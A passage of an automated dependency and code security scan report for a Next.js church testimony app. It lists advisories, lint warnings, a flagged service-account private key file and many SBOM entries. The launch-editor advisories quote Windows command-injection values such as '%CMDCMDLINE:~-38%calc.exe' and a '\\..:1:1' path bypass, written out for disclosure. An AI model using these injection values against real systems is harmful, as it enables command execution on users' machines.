`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.

Combined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.

### Impact

Only apps that runs on Windows is affected.

### Details

The earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.
4. Because the existence check passes, the crafted filename reaches the Windows shell command.

---
## [🟠 HIGH] F-c5502f42624f: launch-editor: escapeCmdArgs() omits % escaping on Windows
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
### Summary

`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.

### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing `&` or `%`
- Either of
  - An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.

Because `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`

---
## [🔵 LOW] F-e093ca4dbe34: Information exposure in Next.js dev server due to lack of origin verification
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `2.0/10`

**Technical Details:**
## Summary

A low-severity vulnerability in **Next.js** has been fixed in **version 15.2.2**. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while `npm run dev` is active.

Because the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure `allowedDevOrigins` in your next config after upgrading to a patched version. [Learn more](https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins).

Learn more: https://vercel.com/changelog/cve-2025-48068

## Credit

Thanks to [sapphi-red](https://github.com/sapphi-red) and [Radman Siddiki](https://github.com/R4356th) for responsibly disclosing this issue.

---
## [🔵 LOW] F-2880d9c7b770: Next.js vulnerable to cache poisoning via collisions in React Server Component cache-busting
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `2.0/10`

**Technical Details:**
### Impact

React Server Component responses can be vulnerable to cache poisoning in deployments that rely on shared caches with insufficient response partitioning. In affected conditions, collisions in the `_rsc` cache-busting value can allow an attacker to poison cache entries so users receive the wrong response variant for a given URL.

### Fix

We strengthened the `_rsc` cache-busting mechanism to make practical collisions significantly harder and to better separate response variants that should not share cache entries.

### Workarounds

If you cannot upgrade immediately, ensure intermediary caches correctly honor `Vary` for RSC-related request headers, or disable shared caching for affected RSC responses until you can deploy a patched release.

---
## [🔵 LOW] F-52e68298b5e1: Next.js's Middleware / Proxy redirects can be cache-poisoned
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `2.0/10`

**Technical Details:**
### Impact

Next.js uses the `x-nextjs-data` request header for internal data requests. On affected versions, an external client could send this header on a normal request to a path handled by middleware that returns a redirect.

When that happened, the middleware/proxy could treat the request as a data request and replace the standard `Location` redirect header with the internal `x-nextjs-redirect` header. Browsers do not follow `x-nextjs-redirect`, so the response became an unusable redirect for normal clients.

If the application was deployed behind a CDN or reverse proxy that caches 3xx responses without varying on this header, a single attacker request could poison the cached redirect response for the affected path. Subsequent visitors could then receive a cached redirect response without a `Location` header, causing a denial of service for that redirect path until the cache entry expired or was purged.

### Affected scenarios

This affects applications that:
- use middleware or proxy redirects
- are deployed behind a caching CDN or reverse proxy
- allow 3xx responses on those paths to be cached without differentiating internal data requests from normal requests

### Fix

The fix stops trusting `x-nextjs-data` by itself for middleware redirect handling. A request is now treated as an internal data request only when it is validated as such by internal routing state, preserving legitimate data-request redirect behavior while preventing external header injection from changing normal redirect responses.

### Workarounds

Before upgrading, users can reduce risk by:
- configuring the CDN or reverse proxy to vary its cache key on `x-nextjs-data` for affected responses

---
## [🔵 LOW] F-26f87e9d881e: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring
- **Location:** `app/api/testimonies/route.ts`:94
- **Category:** `sast` | **Source:** `semgrep` | **Risk Score:** `1.6/10`

**Technical Details:**
Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.

---
## [🔵 LOW] F-6f46273b6f19: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring
- **Location:** `app/api/testimonies/route.ts`:148
- **Category:** `sast` | **Source:** `semgrep` | **Risk Score:** `1.6/10`

**Technical Details:**
Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.

---
## [🔵 LOW] F-b78c21239cea: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring
- **Location:** `app/api/testimonies/route.ts`:174
- **Category:** `sast` | **Source:** `semgrep` | **Risk Score:** `1.6/10`

**Technical Details:**
Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.

---
## [🔵 LOW] F-4df8d0d4d814: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring
- **Location:** `app/api/testimonies/route.ts`:197
- **Category:** `sast` | **Source:** `semgrep` | **Risk Score:** `1.6/10`

**Technical Details:**
Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.

---
## [🔵 LOW] F-ef72a399b88d: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring
- **Location:** `app/api/testimonies/route.ts`:218
- **Category:** `sast` | **Source:** `semgrep` | **Risk Score:** `1.6/10`

**Technical Details:**
Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.

---
## [🔵 LOW] F-6fc55c31ac98: Private Key
- **Location:** `quiet-capsule-507110-k4-41b4a5220f10.json`:5
- **Category:** `iac` | **Source:** `checkov` | **Risk Score:** `1.6/10`

**Technical Details:**
CKV_SECRET_13 - https://docs.prismacloud.io/en/enterprise-edition/policy-reference/secrets-policies/secrets-policy-index/git-secrets-13

---
## [⚪ INFO] F-1e9937279f58: Dependency: @deepgram/captions@1.2.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40deepgram/captions@1.2.0?package-id=7c21a5538aff824a

---
## [⚪ INFO] F-23672b970f25: Dependency: @deepgram/sdk@3.13.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40deepgram/sdk@3.13.0?package-id=e7a605ffb0150df7

---
## [⚪ INFO] F-d0ccf79ad755: Dependency: @next/env@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/env@14.2.24?package-id=0a20e10bac8f646d

---
## [⚪ INFO] F-21a95f0629bc: Dependency: @next/swc-darwin-arm64@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-darwin-arm64@14.2.24?package-id=665b2c2695882e3c

---
## [⚪ INFO] F-fa240a820e30: Dependency: @next/swc-darwin-x64@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-darwin-x64@14.2.24?package-id=17583d1190bcb2db

---
## [⚪ INFO] F-06bb3baefb7a: Dependency: @next/swc-linux-arm64-gnu@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-linux-arm64-gnu@14.2.24?package-id=c7ca85d7b64e76bb

---
## [⚪ INFO] F-a7b4dd120c4b: Dependency: @next/swc-linux-arm64-musl@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-linux-arm64-musl@14.2.24?package-id=a3cc6b792b59617a

---
## [⚪ INFO] F-9c376fc1f41c: Dependency: @next/swc-linux-x64-gnu@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-linux-x64-gnu@14.2.24?package-id=87673f6c9c6612a9

---
## [⚪ INFO] F-3a263937b7a2: Dependency: @next/swc-linux-x64-musl@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-linux-x64-musl@14.2.24?package-id=0d3f7fa4a66dd2ee

---
## [⚪ INFO] F-1487b0b1b37e: Dependency: @next/swc-win32-arm64-msvc@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-win32-arm64-msvc@14.2.24?package-id=c7391f60fe094878

---
## [⚪ INFO] F-993666686984: Dependency: @next/swc-win32-ia32-msvc@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-win32-ia32-msvc@14.2.24?package-id=63c510c9c3d67f61

---
## [⚪ INFO] F-4bf54e74ffe7: Dependency: @next/swc-win32-x64-msvc@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40next/swc-win32-x64-msvc@14.2.24?package-id=b5856075bca282a6

---
## [⚪ INFO] F-1a129b10aaa8: Dependency: @swc/counter@0.1.3
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40swc/counter@0.1.3?package-id=d1ab0047814562a3

---
## [⚪ INFO] F-f610d3e82de1: Dependency: @swc/helpers@0.5.5
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40swc/helpers@0.5.5?package-id=72bc47189d44cca0

---
## [⚪ INFO] F-03c12eff911d: Dependency: @types/node@18.19.130
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/%40types/node@18.19.130?package-id=6d23cd869ae37092

---
## [⚪ INFO] F-633cc5bcf969: Dependency: actions/checkout@v2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/checkout@v2?package-id=8939931398f7f376

---
## [⚪ INFO] F-ef002b8299cc: Dependency: actions/checkout@v2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/checkout@v2?package-id=9ed4a1365893a541

---
## [⚪ INFO] F-f446e6f46ed0: Dependency: actions/checkout@v2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/checkout@v2?package-id=bf473f4674a4b4c1

---
## [⚪ INFO] F-171deb6e8b7f: Dependency: actions/checkout@v2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/checkout@v2?package-id=7ec5891cc205a593

---
## [⚪ INFO] F-9d5cd5d44a63: Dependency: actions/checkout@v4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/checkout@v4?package-id=fd10fce47017fa13

---
## [⚪ INFO] F-d4ce1ee27bca: Dependency: actions/setup-node@v1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/setup-node@v1?package-id=6b0792dcccc67817

---
## [⚪ INFO] F-3adb140da6ea: Dependency: actions/setup-node@v1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/setup-node@v1?package-id=0dc9162b75e9df6b

---
## [⚪ INFO] F-4d3f0ced80ce: Dependency: actions/setup-node@v1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/setup-node@v1?package-id=303b3812127b618f

---
## [⚪ INFO] F-f629b4e33343: Dependency: actions/setup-node@v1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/setup-node@v1?package-id=5dcd76ce8f7aa30c

---
## [⚪ INFO] F-4ee19f45f5fc: Dependency: actions/setup-node@v4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:github/actions/setup-node@v4?package-id=de6527b74c32bd7a

---
## [⚪ INFO] F-0e22ae0298ef: Dependency: agent-base@7.1.4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/agent-base@7.1.4?package-id=f7259be6132b188d

---
## [⚪ INFO] F-82eb42af190f: Dependency: base64-js@1.5.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/base64-js@1.5.1?package-id=c7ab39b9720e240f

---
## [⚪ INFO] F-9d1d0bc6804e: Dependency: bignumber.js@9.3.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/bignumber.js@9.3.1?package-id=0debd0f90c403668

---
## [⚪ INFO] F-701132a98969: Dependency: buffer-equal-constant-time@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/buffer-equal-constant-time@1.0.1?package-id=ea42e35a908d5ccd

---
## [⚪ INFO] F-e6ee7516dae8: Dependency: busboy@1.6.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/busboy@1.6.0?package-id=3009b8237fb85cf0

---
## [⚪ INFO] F-63018afecd01: Dependency: call-bind-apply-helpers@1.0.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/call-bind-apply-helpers@1.0.2?package-id=2303cf02934afa6a

---
## [⚪ INFO] F-dbe562ca43e5: Dependency: call-bound@1.0.4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/call-bound@1.0.4?package-id=23c8e695a4ffce79

---
## [⚪ INFO] F-22ca1785d9f6: Dependency: caniuse-lite@1.0.30001810
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/caniuse-lite@1.0.30001810?package-id=3ce977ca33321e77

---
## [⚪ INFO] F-194d038b5573: Dependency: canvas-confetti@1.9.4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/canvas-confetti@1.9.4?package-id=50ce49f656bed2ac

---
## [⚪ INFO] F-e44f91dad633: Dependency: church-testimony-platform@1.0.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/church-testimony-platform@1.0.0?package-id=c760f5c4eb1ae3ec

---
## [⚪ INFO] F-aaa2fb9a6359: Dependency: client-only@0.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/client-only@0.0.1?package-id=e7be86c370ee2217

---
## [⚪ INFO] F-0bceca5e6998: Dependency: clsx@2.1.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/clsx@2.1.1?package-id=1cdd74d474651cd1

---
## [⚪ INFO] F-68d90717f858: Dependency: cross-fetch@3.2.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/cross-fetch@3.2.0?package-id=1ef521ded724ae55

---
## [⚪ INFO] F-7698e6302bfe: Dependency: dayjs@1.11.23
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/dayjs@1.11.23?package-id=b0eccb2a07cb8729

---
## [⚪ INFO] F-8c1de210a752: Dependency: debug@4.4.3
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/debug@4.4.3?package-id=96b0606cb5228062

---
## [⚪ INFO] F-9fbd7e7a9183: Dependency: deepmerge@4.3.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/deepmerge@4.3.1?package-id=6fcde9d497e83e33

---
## [⚪ INFO] F-69b6777c872a: Dependency: dunder-proto@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/dunder-proto@1.0.1?package-id=23d9641db70f3051

---
## [⚪ INFO] F-6dfbebb66d58: Dependency: ecdsa-sig-formatter@1.0.11
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/ecdsa-sig-formatter@1.0.11?package-id=4ed0ded14e893339

---
## [⚪ INFO] F-f46561608800: Dependency: es-define-property@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/es-define-property@1.0.1?package-id=198a07fe3b41a7bb

---
## [⚪ INFO] F-65b3ae81b97f: Dependency: es-errors@1.3.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/es-errors@1.3.0?package-id=524e10cb2d7467ea

---
## [⚪ INFO] F-52387a9c03f5: Dependency: es-object-atoms@1.1.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/es-object-atoms@1.1.2?package-id=d98c6075944b50e7

---
## [⚪ INFO] F-949706e2d844: Dependency: events@3.3.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/events@3.3.0?package-id=bca3d6fcf9ecc55d

---
## [⚪ INFO] F-438710348800: Dependency: extend@3.0.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/extend@3.0.2?package-id=c7f94791a09e5a4e

---
## [⚪ INFO] F-913f666e4dbe: Dependency: function-bind@1.1.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/function-bind@1.1.2?package-id=a9db1e71931f56ac

---
## [⚪ INFO] F-35161bef2a1f: Dependency: gaxios@6.7.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/gaxios@6.7.1?package-id=9d900b217a57abee

---
## [⚪ INFO] F-3ae354a49e7a: Dependency: gcp-metadata@6.1.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/gcp-metadata@6.1.1?package-id=aa3886c02ba5c2c5

---
## [⚪ INFO] F-95a28c8657cf: Dependency: get-intrinsic@1.3.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/get-intrinsic@1.3.0?package-id=338eac46e71d483e

---
## [⚪ INFO] F-eb114c2ae829: Dependency: get-proto@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/get-proto@1.0.1?package-id=64572c87855a75b1

---
## [⚪ INFO] F-be21c7bf5c44: Dependency: google-auth-library@9.15.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/google-auth-library@9.15.1?package-id=4fb04863a4dacd73

---
## [⚪ INFO] F-91bdb348b7e2: Dependency: google-logging-utils@0.0.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/google-logging-utils@0.0.2?package-id=c45a9f7f7c5a1d26

---
## [⚪ INFO] F-b9deb85b9ead: Dependency: googleapis-common@7.2.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/googleapis-common@7.2.0?package-id=3b50df949c2a6c75

---
## [⚪ INFO] F-a854b61c1bd0: Dependency: googleapis@144.0.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/googleapis@144.0.0?package-id=cbebfe1c1144cd18

---
## [⚪ INFO] F-2604fea651da: Dependency: gopd@1.2.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/gopd@1.2.0?package-id=2f2433574e565258

---
## [⚪ INFO] F-cda42645689e: Dependency: graceful-fs@4.2.11
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/graceful-fs@4.2.11?package-id=45319b4c36cfb339

---
## [⚪ INFO] F-661e08d88084: Dependency: gtoken@7.1.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/gtoken@7.1.0?package-id=fe4d11ddc8ba95f7

---
## [⚪ INFO] F-3abd31d557b0: Dependency: has-symbols@1.1.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/has-symbols@1.1.0?package-id=fcd80b2c54be3c8f

---
## [⚪ INFO] F-fb337edef5cd: Dependency: hasown@2.0.4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/hasown@2.0.4?package-id=ad3baa160b5a466b

---
## [⚪ INFO] F-2401cb5307e4: Dependency: https-proxy-agent@7.0.6
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/https-proxy-agent@7.0.6?package-id=2d10e944bb8687bf

---
## [⚪ INFO] F-bce41115e7ff: Dependency: is-stream@2.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/is-stream@2.0.1?package-id=0d47a7f43264d12f

---
## [⚪ INFO] F-52fc091f307c: Dependency: js-tokens@4.0.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/js-tokens@4.0.0?package-id=132a500346fcea0c

---
## [⚪ INFO] F-f52b26349e09: Dependency: json-bigint@1.0.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/json-bigint@1.0.0?package-id=f29c1976ad3d8cb0

---
## [⚪ INFO] F-7abe0da58397: Dependency: jwa@2.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/jwa@2.0.1?package-id=154697ca4fb19b8b

---
## [⚪ INFO] F-165607d64230: Dependency: jws@4.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/jws@4.0.1?package-id=7fed8e7a1bc916bb

---
## [⚪ INFO] F-a05b2e7d64cf: Dependency: loose-envify@1.4.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/loose-envify@1.4.0?package-id=01ac139389c8bf08

---
## [⚪ INFO] F-8141d54cf584: Dependency: lucide-react@0.475.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/lucide-react@0.475.0?package-id=07bdaa740e01855d

---
## [⚪ INFO] F-af2db9dca363: Dependency: math-intrinsics@1.1.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/math-intrinsics@1.1.0?package-id=87a83232f7674dbc

---
## [⚪ INFO] F-68e3c97d68f5: Dependency: ms@2.1.3
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/ms@2.1.3?package-id=bb1077662b3cb7e0

---
## [⚪ INFO] F-e80bb08a2dcd: Dependency: nanoid@3.3.18
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/nanoid@3.3.18?package-id=4850f4ccd0bf0d3d

---
## [⚪ INFO] F-814ba85e3c87: Dependency: next@14.2.24
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/next@14.2.24?package-id=1ac3d27832da5c77

---
## [⚪ INFO] F-7ef6df0be51c: Dependency: node-fetch@2.7.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/node-fetch@2.7.0?package-id=71294da0e67ef2a3

---
## [⚪ INFO] F-fabe04ccf1d1: Dependency: object-inspect@1.13.4
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/object-inspect@1.13.4?package-id=67701f4036faa68d

---
## [⚪ INFO] F-97459238b3e7: Dependency: picocolors@1.1.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/picocolors@1.1.1?package-id=9b208867cdc8b323

---
## [⚪ INFO] F-a25a87d66900: Dependency: postcss@8.4.31
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/postcss@8.4.31?package-id=a519bffcd9b56c6d

---
## [⚪ INFO] F-4d0329240777: Dependency: qs@6.16.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/qs@6.16.0?package-id=8637eb5958126ecb

---
